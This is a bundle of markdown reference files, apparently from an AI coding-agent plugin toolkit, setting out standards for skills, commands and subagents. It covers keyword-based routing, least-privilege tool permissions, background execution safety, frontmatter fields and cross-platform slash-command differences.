\"Review code style and formatting\"\n\n### General Analysis\n**Triggers:** \"general\", \"overall\", \"review\"\n**Routes to:** General code review skill\n**Pattern:** \"Perform general code review\"\n\n## Implementation\n\n```python\ndef route_analysis_request(request):\n    \"\"\"Route to appropriate analysis skill\"\"\"\n\n    request_lower = request.lower()\n\n    # Security routing\n    if any(term in request_lower for term in ['security', 'vulnerab', 'xss', 'injection']):\n        return {\n            'skill': 'security-analysis',\n            'pattern': 'Analyze code for security issues'\n        }\n\n    # Performance routing\n    if any(term in request_lower for term in ['performance', 'speed', 'optimize', 'bottleneck']):\n        return {\n            'skill': 'performance-analysis',\n            'pattern': 'Analyze code for performance issues'\n        }\n\n    # Style routing\n    if any(term in request_lower for term in ['style', 'format', 'lint', 'convention']):\n        return {\n            'skill': 'code-style',\n            'pattern': 'Review code style and formatting'\n        }\n\n    # Default routing\n    return {\n        'skill': 'general-review',\n        'pattern': 'Perform general code review'\n    }\n```\n\n## Usage Example\n\n**Input:** \"Analyze this code for security vulnerabilities\"\n**Routing:** Detects \"security\"  Routes to security-analysis skill\n**Output:** \"Delegating to security-analysis skill for vulnerability assessment\"\n\n**Input:** \"Review this function for performance issues\"\n**Routing:** Detects \"performance\"  Routes to performance-analysis skill\n**Output:** \"Delegating to performance-analysis skill for performance assessment\"\n\n## Anti-Patterns to Avoid\n\n **Over-complex routing logic** - Keep it simple and clear\n **Hardcoding all possible requests** - Use keyword matching\n **No default route** - Always have a fallback\n **Bypassing specialized skills** - Don't try to do everything in router\n\n## Success Criteria\n\n- [ ] Routes correctly to specialized skills\n- [ ] Handles unknown requests gracefully\n- [ ] Clear delegation messages\n- [ ] No infinite routing loops\n- [ ] Easy to add new routes\n```\n",
        "plugins/sys-core/skills/adhering-standards/references/agent-security.md": "# Subagent Permissions & Security\n\n## Overview\n\nAgents (subagents) use the `tools` field in their frontmatter to control which tools they can access. Unlike commands and skills, agents run in **isolated contexts** and have distinct permission semantics.\n\n## Key Principle\n\n> **Agents inherit all tools by default.** The `tools` field is used to **restrict** access to only the tools explicitly listed.\n\n## Autonomy First Principle\n\n**This toolkit is designed for autonomous operation.** Agents should complete tasks independently with minimal user interaction.\n\n### AskUserQuestion: Use Only When Explicitly Required\n\n **WARNING**: `AskUserQuestion` should **NOT** be included in agent tools by default.\n\n**Only include `AskUserQuestion` when:**\n- The user **explicitly requests** interactive behavior\n- The task **genuinely requires** human judgment that cannot be automated\n- The workflow is **designed** to gather requirements upfront before execution\n\n**DO NOT include `AskUserQuestion` when:**\n- The agent should work autonomously (most cases)\n- You want to pause for decisions that can be reasonably assumed\n- The agent's role is analysis, not gathering input\n- You're unsure if it's needed\n\n**Default Behavior:**\n- Omit `AskUserQuestion` from tools field\n- Let the agent make reasonable decisions based on context\n- Provide options in the final output for user review\n- Use the agent's description to guide its behavior\n\n**The goal**: You describe the task  Agent figures out how to do it  Agent completes it  You review the result.\n\n## Frontmatter Field\n\n| Field | Type | Required | Default | Behavior |\n|-------|------|----------|---------|----------|\n| `tools` | String (comma-separated) | No | Inherit all | If specified, ONLY these tools are available |\n\n## Available Tools\n\n**Core Tools:**\n- `Read`, `Write`, `Edit` - File operations\n- `Glob`, `Grep` - File search\n- `Bash` - Execute shell commands\n- `TodoWrite` - Manage todo lists\n- `Skill`, `SlashCommand` - Invoke skills and commands\n- `Task` - Delegate to subagents\n- `WebSearch`, `WebFetch` - Web access\n- `BashOutput`, `KillShell` - Background shell management\n- `NotebookEdit` - Jupyter notebook editing\n- `ExitPlanMode` - Plan mode control\n\n**Plus:** MCP tools from configured MCP servers can also be specified.\n\n## Critical Permission Rules\n\n### Inheritance Rules\n\n**If `tools` field is omitted:**\n- Agent inherits ALL tools from main conversation\n- Including `AskUserQuestion` (if available in main)\n- Use this for general-purpose agents\n\n**If `tools` field is specified:**\n- ONLY tools listed are available\n- ALL other tools are blocked\n- Use this for security and focus\n\n### Background Execution Safety\n\n**Read-only agents (safe for background):**\n- Tools: `Read`, `Grep`, `Glob` only\n- Cannot modify files or execute commands\n- Safe for asynchronous execution\n\n**Write/execute agents (unsafe for background):**\n- Tools include `Write`, `Edit`, `Bash`\n- Require user confirmation or foreground mode\n- May need `AskUserQuestion` for permissions\n\n## Security Principles\n\n### Least Privilege\n\n**Follow least privilege:**\n- Grant only necessary tools\n- Default to read-only when possible\n- Add tools only when clearly needed\n- Review permissions periodically\n\n### Permission Patterns\n\n**Analysis agents:**\n```yaml\ntools: Read, Grep, Glob\n```\n\n**Generation agents:**\n```yaml\ntools: Read, Write, Edit, Glob\n```\n\n**Research agents:**\n```yaml\ntools: Read, Grep, Glob, WebSearch, WebFetch\n```\n\n**Full-capability agents:**\n```yaml\ntools: Read, Write, Edit, Glob, Grep, Bash\n```\n\n## Model Selection\n\n### Available Models\n\n- `sonnet` - Default, good balance\n- `opus` - Most capable, complex reasoning\n- `haiku` - Fast, simple tasks\n- `inherit` - Use same model as main conversation\n\n### Model Selection Rules\n\n**Use `inherit` (default) when:**\n- Task doesn't need specific model capabilities\n- User hasn't specified a model\n- Agent should adapt to main conversation\n\n**Use `sonnet` when:**\n- Complex reasoning required\n- Multi-step analysis\n- Default choice for most agents\n\n**Use `opus` when:**\n- Highly complex reasoning\n- Advanced problem-solving\n- Explicitly requested\n\n**Use `haiku` when:**\n- Simple, straightforward tasks\n- Speed is critical\n- Basic information retrieval\n\n## Background Execution\n\n### Overview\n\nBackground subagent execution allows agents to run asynchronously without blocking the main conversation. This enables parallel processing, long-running tasks, and improved user experience by deferring work to separate contexts.\n\n** Platform-Specific Feature**\n\nBackground execution is **platform-dependent**. Not all AI systems support it, and implementations vary:\n\n- Some platforms support true asynchronous background execution\n- Some platforms simulate it through parallel agent invocation\n- Some platforms don't support it at all\n\n**Always document background execution as optional** and provide fallback behavior.\n\n### Key Principle\n\n> **Background agents run in isolation** - they cannot easily request user input or permissions during execution.\n\n### Execution Modes\n\n#### Foreground Execution (Default)\n\nSubagent runs synchronously, blocking the main conversation until completion.\n\n**Characteristics:**\n- Main conversation waits for subagent to finish\n- User sees subagent's final output when it completes\n- Subagent can potentially request input (if tools allow)\n- Context consumed in main conversation window\n\n**Use when:**\n- Task requires user interaction or confirmation\n- Result is needed before proceeding\n- Task is short (seconds to minutes)\n\n#### Background Execution (Platform-Dependent)\n\nSubagent runs asynchronously, main conversation continues immediately.\n\n**Characteristics:**\n- Main conversation continues without waiting\n- Subagent runs in isolated context\n- Result retrieved later (method varies by platform)\n- Context NOT consumed in main conversation (major benefit)\n\n**Use when:**\n- Long-running tasks (minutes to hours)\n- Parallel processing desired\n- User wants immediate continuation\n- Task doesn't need immediate result\n\n### Risk Assessment Matrix\n\n| Tool Type | Background Safe? | Requires Approval? | Risk Level |\n|-----------|----------------|-------------------|------------|\n| Read-only | Yes | No | Low |\n| Write-only | Conditional | Yes | Medium |\n| Execute (Bash) | No | Yes | High |\n| Web access | Conditional | Yes | Medium |\n| File edit | No | Yes | High |\n\n### Safety Protocols\n\n**Background-safe agents:**\n- Use only read-only tools\n- Pre-approved tool access\n- Don't require user interaction\n- Provide exhaustive context in task prompt\n\n**Background-unsafe agents:**\n- Use Write/Edit/Bash without pre-approval\n- Require user interaction or confirmation\n- Perform destructive operations\n- Need immediate feedback\n\n## Cross-Platform Compatibility\n\n### Platform-Specific Considerations\n\n**File System:**\n- Use forward slashes in paths\n- Avoid hardcoded separators\n- Test across Windows/Mac/Linux\n\n**Shell Commands:**\n- Use POSIX-compliant syntax\n- Avoid platform-specific features\n- Test commands on target platforms\n\n**Python Scripts:**\n- Specify version requirements\n- Use cross-platform libraries\n- Avoid OS-specific imports\n\n## Error Handling\n\n### Common Failure Modes\n\n**Permission denied:**\n- Tool not in allowed list\n- Background execution attempted\n- Insufficient privileges\n\n**Context isolation:**\n- Cannot access main conversation state\n- Must rely on task prompt context\n- Cannot request additional information\n\n**Tool unavailability:**\n- MCP server not connected\n- Platform doesn't support tool\n- Version mismatch\n\n### Recovery Strategies\n\n**Graceful degradation:**\n- Continue with available tools\n- Log errors to disk\n- Provide partial results\n\n**Retry patterns:**\n- One retry with different strategy\n- Exponential backoff\n- Circuit breaker for repeated failures\n\n**Handoff protocol:**\n- Create HANDOFF.md when blocked\n- Document what was attempted\n- Explain what user needs to do\n\n## Testing Permissions\n\n### Validation Checklist\n\n**Before deploying agent:**\n- [ ] Tools explicitly listed if needed\n- [ ] Least privilege principle followed\n- [ ] Background safety verified\n- [ ] Cross-platform compatibility tested\n- [ ] Error handling documented\n\n**For each tool:**\n- [ ] Tool actually needed\n- [ ] Risk level acceptable\n- [ ] Alternatives considered\n- [ ] Security implications reviewed\n",
        "plugins/sys-core/skills/adhering-standards/references/background-execution.md": "# Background Execution Patterns for Commands\n\n## Overview\n\nCommands can delegate to subagents with background execution for asynchronous task processing. This enables launching long-running work while allowing the user to continue working.\n\n## Key Principle\n\n> **Commands delegate, agents execute.** Commands provide context and instructions for background agents to work autonomously.\n\n---\n\n## Core Patterns\n\n### 1. Single Background Agent\nDelegate a single long-running task to a background agent.\n\n```yaml\n---\ndescription: Analyze codebase architecture in background\nargument-hint: [path-to-analyze]\nallowed-tools: Task\ndisable-model-invocation: true\n---\n\nSpawn a background agent to analyze: $ARGUMENTS\n\n**Provide exhaustive context including:**\n- What the code does\n- Goal (e.g., security, performance)\n- Scope and boundaries\n- Expected output format\n```\n\n### 2. Parallel Fan-Out\nLaunch multiple background agents simultaneously for independent tasks.\n\n```yaml\n---\ndescription: Parallel security and performance analysis\nargument-hint: [module]\nallowed-tools: Task\ndisable-model-invocation: true\n---\n\nSpawn 2 background agents in parallel:\n- Agent 1: Analyze $ARGUMENTS for security vulnerabilities\n- Agent 2: Analyze $ARGUMENTS for performance bottlenecks\n\nSynthesize both reports when complete.\n```\n\n### 3. Hybrid Foreground/Background\nLaunch background agents, then do foreground work while waiting.\n\n```yaml\n---\ndescription: Background analysis with foreground prep work\nallowed-tools: Task, Read, Edit\n---\n\nTask the code-explorer agent to analyze in background.\nWhile background agent runs:\n1. Review existing documentation\n2. Prepare integration plan\n```\n\n---\n\n## Permission & Security\n\n### Background Safety\nEnsure the target agent is \"background safe\":\n1. **Read-only tools** (Read, Grep, Glob) are always safe.\n2. **Bash execution** can be used in background if properly designed (no user interaction).\n3. **File operations** require pre-approval or explicit design for background.\n4. **Critical constraint**: Agents cannot use AskUserQuestion in background - all decisions must be autonomous.\n\n### Tool Restrictions\nCommands should focus on delegation. Use `allowed-tools: Task` to restrict the command to delegation only.\n\n---\n\n## Context Provisioning\n\nAgents start with fresh context. Commands MUST provide:\n- **Background**: Project/codebase context.\n- **Goal**: Clear objective.\n- **Constraints**: Limitations or requirements.\n- **Expected Output**: Specific format needed.\n\n---\n\n## Error Handling\n\nIf a background agent fails or gets stuck:\n1. Inform the user the background task encountered issues.\n2. Suggest an alternative (foreground execution).\n3. Provide partial results if available.\n",
        "plugins/sys-core/skills/adhering-standards/references/command-standards.md": "# Command Creation Standards\n\n## 1. Structural Patterns\n\n### Ultra-Minimalist (Default)\n```yaml\n---\ndescription: {Brief, human-friendly description}\nargument-hint: [{optional argument description}]\n---\n{One-line instruction}\n```\n\n### Structured (Multi-step)\n```markdown\n## Objective\n{Goal description}\n\n## Process\n1. {Step 1}\n2. {Step 2}\n\n## Success Criteria\n- {Result 1}\n```\n\n## 2. XML vs Markdown Matrix\n\n| Use Case | Recommended Format |\n|----------|--------------------|\n| Default structure | Markdown |\n| Machine-parsed routing | `<routing>` (Table) |\n| Intent Analysis | `<intent_analysis>` |\n| Strict Constraints | `<constraints>` |\n\n## 3. Description Specifications\n\n- **Formula**: `{Action Verb} + {Context/Trigger}`\n- **Required Keywords**:\n  - `MUST`: Critical operations.\n  - `PROACTIVE`: Recommended workflows.\n  - `CONSULT`: Reference expertise.\n\n## 4. User-Centric Wrappers\n\n- **Condition**: Command delegates to `Skill` or `Task` tools.\n- **Requirement**: `disable-model-invocation: true` in frontmatter.\n- **Goal**: Prevent AI from programmatically calling what it can already do via tools.\n",
        "plugins/sys-core/skills/adhering-standards/references/component-guidelines.md": "# Component Guidelines\n\n## Skills Management\n\n### Standards File\n**See:** `standards-communication.md` for complete skills standards\n\n### Use Cases\nCreating new skills, selecting templates, progressive disclosure, YAML frontmatter, security patterns\n\n### Frontmatter Requirements\n- `name`: Component identifier (1-64 chars, lowercase)\n- `description`: Purpose and trigger conditions\n- `allowed-tools`: Tool restrictions (security)\n- `context`: fork or inline (for skills requiring isolation)\n- `user-invocable`: Control visibility in / menu (for skills)\n- `disable-model-invocation`: Prevent auto-triggering (for commands/skills)\n\n### Template Selection\n\n| Template | Use Case |\n|----------|----------|\n| `standard-skill.md` | Single-workflow skills (Minimal/Task) |\n| `router-pattern.md` | Complex skills with 4+ workflows |\n| `progressive-disclosure.md` | Skills requiring references/ subdirectory |\n| `reference-file.md` | Reference document formatting |\n\n### Key Principles\n- Progressive disclosure for complex skills\n- Fork vs inline execution decision matrix\n- Security and tool restrictions\n- Reference file organization\n\n## Commands Management\n\n### Standards File\n**See:** `command-standards.md` for complete command standards\n\n### Essential Principles\n\n#### 1. Command Shortcuts are Standard\nA Command that wraps a single Skill (e.g., `allowed-tools: [Skill(name)]`) is a **Recommended Pattern**. It acts as a Zero-Token Shortcut for the user.\n\n#### 2. Redundancy Check (The \"Glue\" Trap)\n\n**FLAG**: A Command that *re-implements* the logic of a Skill in its prompt. This is code duplication.\n\n**FIX**: Delete the prompt logic and replace it with a call to `Skill(name)`.\n\n**FLAG**: A Command and a Skill with identical descriptions/triggers.\n\n**FIX**: Differentiate them. Logic lives in Skill (\"USE when...\"), Shortcut lives in Command (\"Shortcut for...\").\n\n#### 3. Commands Orchestrate Multi-Skill Workflows\nCommands are also used to sequence multiple Skills (Macro) or provide \"Wizard\" style interactions.\n\n### Template Selection\n\n| Template | Use Case |\n|----------|----------|\n| `read-only-command.md` | Analysis and exploration commands |\n| `autonomous-wrapper.md` | Commands that execute without user interaction |\n| `interactive-wizard.md` | Commands that guide users through setup |\n\n## Agents Management\n\n### Standards File\n**See:** `agent-security.md` for complete agent standards\n\n### Core Principle\n\n**Agents are Primarily Personas for Skills.** When defining an agent, primarily design it to be bound to a Skill via `agent: [name]` in the skill frontmatter.\n\n**Agent Frontmatter Fields:**\n- `name`: Agent identifier\n- `tools`: Tool whitelist (security - REQUIRED)\n- `skills`: Skills to auto-load (optional)\n- `description`: Agent role and purpose\n\n**Default to Pure Markdown.** Most agents work well with simple Markdown structure (`## Role`, `## Workflow`, `## Constraints`). Add XML tags only when complexity genuinely requires it.\n\n### Template Selection\n\n| Template | Use Case |\n|----------|----------|\n| `universal-agent.md` | Core, Specialized, or Research agents (Default) |\n| `coordinator-agent.md` | Multi-step orchestration |\n| `explorer-agent.md` | Read-only code exploration |\n| `background-safe-agent.md` | Read-only agents for background execution |\n\n## File Structure Priority\n\n| Type | Location | Scope | Priority |\n|:-----|:---------|:------|:----------|\n| **Project** | `.claude/` | Current project only, portable | Highest |\n| **User** | `~/.claude/` | All projects | Medium |\n| **Plugin** | Plugin's directories | All projects | Lowest |\n\nProject-level components override user-level when names conflict.\n\n## Asset Library\n\n### Templates (`assets/templates/`)\n\nProduction-grade templates for component scaffolding:\n\n**Skill Templates:**\n- `standard-skill.md` - Single-workflow skills\n- `router-pattern.md` - Complex skills with 4+ workflows\n- `progressive-disclosure.md` - Skills requiring references/ subdirectory\n- `reference-file.md` - Reference document formatting\n\n**Command Templates:**\n- `read-only-command.md` - Analysis and exploration\n- `autonomous-wrapper.md` - Autonomous execution\n- `interactive-wizard.md` - User-guided workflows\n\n**Agent Templates:**\n- `universal-agent.md` - Core/Specialized/Research agents\n- `coordinator-agent.md` - Multi-step orchestration\n- `explorer-agent.md` - Read-only exploration\n- `background-safe-agent.md` - Background-safe execution\n\n## Anti-Patterns\n\n| Pattern | Why Avoid | Alternative |\n|:--------|:----------|:------------|\n| **Vague description** | Won't discover | Add specific purpose with \"USE when\" |\n| **XML in description** | Violates Law 4 | Natural Language + USE triggers |\n| **Logic Duplication** | Code rot, maintenance nightmare | Delegate to Skill via `allowed-tools` |\n| **Missing tool restrictions** | Security risk | Add `allowed-tools` whitelist |\n| **AskUser in worker agents** | Background deadlocks | Remove from worker `tools` whitelist |\n| **Overly complex** | Hard to use | Split into multiple components |\n| **Interactive prompts in forked skills** | Breaks async | Make autonomous |\n\n## Description Standards (Law 4)\n\n### SKILL descriptions:\n- **MUST** start with \"USE when [condition]\"\n- Natural language only (no XML tags)\n- Include specific triggers for discovery\n- Use Modal+Condition pattern for high-fidelity matching\n\n### COMMAND descriptions:\n- **NO XML**: Do not use `<example>` tags\n- Natural Language: Use \"USE when [condition]\" or semantic action\n- Include keywords for fuzzy matching\n\n### AGENT descriptions:\n- Include role and trigger conditions\n- \"MUST Use\" for required workers\n- \"PROACTIVELY Use\" for autonomous delegates\n",
        "plugins/sys-core/skills/adhering-standards/references/cross-platform.md": "# Cross-Platform Slash Commands\n\nA comparison of slash command implementations across major AI coding platforms.\n\n## Platform Overview\n\n| Platform | Base Directory | File Extension | Frontmatter Required |\n|----------|----------------|----------------|---------------------|\n| Claude Code | `.claude/commands/` | `.md` | Yes (`description`) |\n| Roo Code | `.roo/commands/` | `.md` | Yes (`description`) |\n| OpenCode | `.opencode/commands/` | `.md` | No (optional metadata) |\n\n## Frontmatter Fields Comparison\n\n### Claude Code\n\n```yaml\n---\ndescription: Required - shown in /help and used for auto-discovery\nallowed-tools: Optional - restrict tools (not enable)\nargument-hint: Optional - shown in autocomplete\ndisable-model-invocation: Optional - prevent programmatic invocation via SlashCommand tool\n---\n```\n\n### Roo Code (Additional Fields)\n\n```yaml\n---\ndescription: Required - command description\nargumentHint: Optional - alias for argument-hint\nmode: Optional - switch mode before execution\n---\n```\n\n**Roo Code `mode` field examples:**\n- `mode: code` - Switch to Code mode\n- `mode: architect` - Switch to Architect mode\n- `mode: ask` - Switch to Ask mode\n\n### OpenCode\n\n```yaml\n---\n# Optional metadata (JSON-style)\nname: command-name\ndescription: Command description\n---\n```\n\nOpenCode focuses on automatic discovery with minimal required frontmatter.\n\n## Argument Handling\n\nAll platforms support similar argument patterns:\n\n| Pattern | Syntax | Description |\n|---------|--------|-------------|\n| All arguments | `$ARGUMENTS` | All arguments as string |\n| Positional | `$1`, `$2`, `$3` | Individual arguments |\n| File reference | `@ $ARGUMENTS` | File path reference |\n| Default value | `${ARGUMENTS:-default}` | Shell parameter expansion |\n\n## Dynamic Context\n\n### Claude Code & Roo Code\n\nUse `!` prefix for bash execution:\n\n```markdown\n## Context\n- Status: ! `git status`\n- Changes: ! `git diff HEAD`\n```\n\n**Requirement**: Must specify `allowed-tools: Bash(...)` when using `!` prefix.\n\n### OpenCode\n\nSupports similar dynamic context but may have different tool permission models.\n\n## Tool Restrictions\n\n### Claude Code\n\n```yaml\nallowed-tools: Bash(git add:*), Bash(git status:*)\n```\n\n**Key point**: `allowed-tools` is for RESTRICTING, not enabling. Commands inherit all tools by default.\n\n### Roo Code\n\nSimilar to Claude Code with Bash pattern restrictions.\n\n### OpenCode\n\nUses pattern-based permissions in configuration files:\n\n```json\n{\n  \"permission\": {\n    \"bash\": {\n      \"git-*\": \"allow\",\n      \"*\": \"deny\"\n    }\n  }\n}\n```\n\n## Command Discovery\n\nAll platforms use automatic directory scanning:\n\n| Platform | Discovery Method | Reload Behavior |\n|----------|-----------------|-----------------|\n| Claude Code | Directory scan | Automatic or restart |\n| Roo Code | File watchers | Real-time |\n| OpenCode | Directory scan | Automatic |\n\n## Naming Conventions\n\n| Platform | Name Source | Character Rules |\n|----------|-------------|-----------------|\n| Claude Code | Filename | Lowercase, hyphens |\n| Roo Code | Filename | Lowercase, special chars removed |\n| OpenCode | Filename or `name` field | Alphanumeric + hyphens |\n\n### Examples\n\n```\n# All platforms interpret similarly\n.claude/commands/git-commit.md  /git-commit\n.roo/commands/api_docs.md  /api-docs (Roo removes underscore)\n.opencode/commands/fix-issue.md  /fix-issue\n```\n\n## Mode Switching (Roo Code Specific)\n\nRoo Code supports mode switching via frontmatter:\n\n```yaml\n---\nmode: architect\ndescription: Design system architecture\n---\n```\n\nWhen invoked, Roo switches to the specified mode before executing the command.\n\n**Common modes:**\n- `code` - Implementation mode\n- `architect` - Design and planning mode\n- `ask` - Q&A mode without file modifications\n\n## Generalist Best Practices\n\n### Platform-Agnostic Patterns\n\nThese patterns work across all platforms:\n\n1. **Required description** - All platforms benefit from clear descriptions\n2. **Argument hints** - Improve user experience on all platforms\n3. **File references** - `@` prefix works universally\n4. **Dynamic context** - `!` prefix for bash (where supported)\n\n### When to Use Platform-Specific Features\n\n| Feature | Use When | Notes |\n|---------|----------|-------|\n| `mode` (Roo) | Need mode-switching behavior | Fallback to manual instructions |\n| `disable-model-invocation` | Commands intended for manual invocation only | Not supported everywhere |\n| `allowed-tools` | Security restrictions | Use default inheritance when possible |\n| Tool permissions | Fine-grained control | OpenCode uses config files |\n\n## Cross-Platform Command Template\n\n```markdown\n---\ndescription: Clear, specific description of when to use this command\nargument-hint: [optional-argument]\n---\n\n## Objective\nOne-sentence summary of what this command does.\n\n## Context\n- Dynamic state: ! `command-if-needed`\n\n## Process\n1. First step\n2. Second step\n3. Third step\n\n## Success Criteria\n- Expected outcome 1\n- Expected outcome 2\n```\n\nThis template works across Claude Code, Roo Code, and OpenCode with minimal modification.\n\n## Migration Guide\n\n### From Claude Code to Roo Code\n\n1. `argument-hint`  `argumentHint` (optional, both work)\n2. Add `mode` field if mode-switching needed\n3. Move file from `.claude/commands/` to `.roo/commands/`\n\n### From Claude Code to OpenCode\n\n1. Remove `allowed-tools` from frontmatter (use config instead)\n2. Move file from `.claude/commands/` to `.opencode/commands/`\n3. Add optional `name` field if different from filename\n\n### From Roo Code to Claude Code\n\n1. Remove `mode` field (add instruction to switch manually)\n2. `argumentHint`  `argument-hint` (optional, both work)\n3. Move file from `.roo/commands/` to `.claude/commands/`\n\n## Key Differences Summary\n\n| Aspect | Claude Code | Roo Code | OpenCode |\n|--------|-------------|----------|----------|\n| Tool restrictions | Frontmatter | Frontmatter | Config file |\n| Mode switching | No | Yes (frontmatter) | No |\n| Argument hint | `argument-hint` | Both forms | `argument-hint` |\n| Permissions | `allowed-tools` | `allowed-tools` | JSON config |\n| Auto-invocation control | Yes | No | No |\n\n## Recommendations\n\n### For Maximum Portability\n\n1. **Use common frontmatter fields:**\n   ```yaml\n   ---\n   description: Clear description\n   argument-hint: [args]\n   ---\n   ```\n\n2. **Avoid platform-specific features:**\n   - Skip `mode` field (add manual instruction)\n   - Skip `disable-model-invocation` (document as manual invocation only)\n   - Use default tool inheritance\n\n3. **Use standard argument patterns:**\n   - `$ARGUMENTS` for all args\n   - `$1`, `$2` for positional\n   - `@ $ARGUMENTS` for files\n\n4. **Document platform differences:**\n   ```markdown\n   ## Platform Notes\n   - Claude Code: Uses /command-name\n   - Roo Code: Switches to code mode first\n   - OpenCode: Requires skill permission\n   ```\n\n### For Platform Optimization\n\nWhen targeting a specific platform, leverage its unique features:\n\n**Claude Code:**\n- Use `allowed-tools` for security\n- Use `disable-model-invocation` for commands intended for manual invocation only\n- Strong description keywords for discovery\n\n**Roo Code:**\n- Use `mode` for automatic switching\n- Leverage file watchers for rapid iteration\n- Use mode-specific command directories\n\n**OpenCode:**\n- Configure permissions in `opencode.json`\n- Use skill system for command packaging\n- Leverage Claude-compatible paths\n",
        "plugins/sys-core/skills/adhering-standards/references/examples.md": "# Working Examples\n\n## Skill Router Pattern\n\nA canonical example of a skill that:\n- Analyzes code to determine workflow\n- Delegates to appropriate sub-skills\n- Uses progressive disclosure\n\n### Key Features\n```yaml\nname: code-analyzer\ndescription: \"Analyzes code and routes to appropriate analysis workflow. USE when analyzing code for security, performance, or architectural issues.\"\ncontext: fork\nallowed-tools: [Read, Grep, Glob, Skill(code-security-audit), Skill(performance-analysis)]\n```\n\n### Pattern Benefits\n- Single entry point for multiple workflows\n- Automatic routing based on context\n- Reusable sub-skills\n- Clean separation of concerns\n\n## Command Orchestration\n\nA command that:\n- Executes git operations\n- Runs deployment gates\n- Uses dynamic context\n\n### Key Features\n```yaml\ndescription: \"Executes git operations and runs deployment gates. USE when committing and deploying changes.\"\nallowed-tools: [Skill(git-operations), Skill(deployment-gates)]\ndisable-model-invocation: true\n```\n\n### Pattern Benefits\n- Multi-skill orchestration\n- User-centric interface\n- Autonomous execution\n- Argument integration with `$ARGUMENTS`\n\n## Background-Safe Agent\n\nA read-only code explorer suitable for background execution.\n\n### Key Features\n```yaml\nname: code-explorer\ndescription: \"Read-only code analysis agent for background execution. MUST Use when analyzing code without modifications.\"\ntools: [Read, Grep, Glob]\n```\n\n### Pattern Benefits\n- Background execution safety\n- Least privilege security\n- Read-only operations\n- No interactive prompts\n\n## Anti-Pattern Examples\n\n### BAD: Vague Description\n```yaml\ndescription: \"Analyzes code\"\n```\n**Problem:** Won't be discovered by users\n\n**Fix:**\n```yaml\ndescription: \"Analyzes code for security vulnerabilities. USE when performing security audits.\"\n```\n\n### BAD: Logic Duplication\n```yaml\ndescription: \"Analyzes code... [embedded analysis logic]\"\nallowed-tools: [Skill(code-analyzer)]\n```\n**Problem:** Code duplication, maintenance nightmare\n\n**Fix:**\n```yaml\ndescription: \"Shortcut for code analysis workflow.\"\nallowed-tools: [Skill(code-analyzer)]\n```\n\n### BAD: Missing Tool Restrictions\n```yaml\ntools: [Read, Write, Edit, Bash]\n```\n**Problem:** Security risk\n\n**Fix:**\n```yaml\ntools: [Read, Grep, Glob]\n```\n",
        "plugins/sys-core/skills/adhering-standards/references/full-spec.md": "# Toolkit Registry - Full Specification\n\n## Component Standards\n\n### Skills Management\n\n**Use for:** Creating new skills, selecting templates, progressive disclosure, YAML frontmatter, security patterns.\n\n**Template Selection:**\n- `standard-skill.md` - Single-workflow skills\n- `router-pattern.md` - Complex skills with 4+ workflows\n- `progressive-disclosure.md` - Skills with references/ subdirectory\n\n### Commands Management\n\n**Essential Principles:**\n\n1. **Command Shortcuts are Standard** - Wrapping a single Skill is recommended\n2. **Redundancy Check** - Avoid duplicating Skill logic in Commands\n3. **Multi-Skill Orchestration** - Sequence multiple Skills\n\n**Template Selection:**\n- `read-only-command.md` - Analysis and exploration\n- `autonomous-wrapper.md` - Autonomous execution\n- `interactive-wizard.md` - User-guided workflows\n\n### Agents Management\n\n**Core Principle:** Agents are primarily personas for Skills, bound via `agent:` field.\n\n**Template Selection:**\n- `universal-agent.md` - Core/Specialized/Research agents (Default)\n- `coordinator-agent.md` - Multi-step orchestration\n- `background-safe-agent.md` - Read-only background execution\n\n## File Structure Priority\n\n| Type | Location | Priority | Scope |\n|:-----|:---------|:---------|:------|\n| **Project** | `.claude/` | Highest | Current project only, portable |\n| **User** | `~/.claude/` | Medium | All projects |\n| **Plugin** | Plugin directories | Lowest | All projects |\n\n## Anti-Patterns\n\n| Pattern | Why Avoid | Alternative |\n|:--------|:----------|:------------|\n| **Vague description** | Won't discover | Use \"USE when [condition]\" |\n| **Logic Duplication** | Maintenance nightmare | Delegate to Skill |\n| **Missing tool restrictions** | Security risk | Add `allowed-tools` |\n| **AskUser in workers** | Background deadlocks | Read-only tools only |\n\n## Description Standards (Law 4)\n\n### SKILL descriptions:\n- **MUST** start with \"USE when\" or \"MUST\" or \"PROACTIVELY\"\n- Natural language only (no XML tags)\n- Include specific triggers for discovery\n\n### COMMAND descriptions:\n- **NO XML**: Natural language only\n- Use \"USE when [condition]\" or semantic action\n- Must have `disable-model-invocation: true`\n- Must have `argument-hint:`\n\n### AGENT descriptions:\n- Include role and trigger conditions\n- \"MUST USE\" for required workers\n\n## Validation\n\nAny component MUST pass validation:\n\n**Skills:** YAML frontmatter, description starts with \"USE when\", `allowed-tools`, progressive disclosure\n\n**Commands:** YAML frontmatter, orchestrates 2+ Skills, clear description, tested invocation\n\n**Agents:** YAML frontmatter, tool restrictions, well-structured prompt, no AskUser in workers\n\n## Examples\n\n### Skill Router Pattern\nDelegates to sub-skills based on code analysis\n\n### Command Orchestration\nMulti-skill workflows with dynamic context\n\n### Background-Safe Agent\nRead-only execution for background tasks\n\n## Standards Documentation\n\n**Component Guidelines:**\n- `references/component-guidelines.md` - Skills, Commands, Agents management\n- `references/validation.md` - Validation protocol and best practices\n- `references/examples.md` - Working examples and anti-patterns\n\n**Standards Documentation:**\n- `references/standards-communication.md` - Common principles\n- `references/command-standards.md` - Command-specific standards\n- `references/agent-security.md` - Agent security guidelines\n- `references/standards-security.md` - Background execution and permissions\n",
        "plugins/sys-core/skills/adhering-standards/references/permissions-guide.md": "# Command Permissions Specification\n\n## 1. Core Tools Reference\n\n| Tool | Purpose | Restriction Pattern |\n|------|---------|---------------------|\n| `Read` | File access | `[Read]` |\n| `Write` | File creation | `[Write]` |\n| `Edit` | Targeted edits | `[Edit]` |\n| `Bash` | Shell execution | `Bash(cmd:*)` |\n| `Task` | Agent delegation | `[Task]` |\n| `Skill` | Skill execution | `Skill(name)` |\n\n## 2. Bash Execution Rules\n\n- **Prefix Matching**: Wildcard `:*` ONLY works at the end.\n- **Security**: Must be explicitly listed if using `!` dynamic context.\n- **Example**: `Bash(git status:*)`, `Bash(npm test:*)`.\n\n## 3. Web & MCP Patterns\n\n- **WebFetch**: `WebFetch(domain:example.com)`\n- **MCP**: `mcp__server__tool` or `mcp__server__*`\n\n## 4. Execution Logic\n\n- **Default**: Command inherits ALL tools if `allowed-tools` is omitted.\n- **Restriction**: If `allowed-tools` is present, ONLY those tools are available.\n- **Autonomous Goal**: Omit `AskUserQuestion` to favor zero-interaction workflows.\n",
